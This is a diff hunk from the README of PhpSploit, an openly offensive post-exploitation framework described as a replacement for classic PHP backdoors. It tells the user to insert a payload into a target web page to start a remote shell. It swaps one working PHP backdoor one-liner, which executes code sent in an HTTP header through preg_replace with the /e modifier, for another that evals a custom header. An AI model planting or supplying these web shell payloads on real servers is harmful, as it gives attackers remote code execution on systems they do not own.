@@ -15,9 +15,9 @@ The PhpSploit framework replaces classic PHP backdoor like "c99.php".
 `[*] The following payload must be inserted in the target web page.`
 `[*] Then adjust the TARGET setting to it in order to start the remote shell`
 ``
-`=====================================================================
-`<?php @preg_replace('/(.*)/e',$_SERVER['HTTP_ACCEPT_CHARSETS'],'');?>
-`=====================================================================
+`==========================================`
+`<?php @eval($_SERVER['HTTP_PHPSPL01T']);?>`
+`==========================================`
 
 ### Advanced Features ###
 
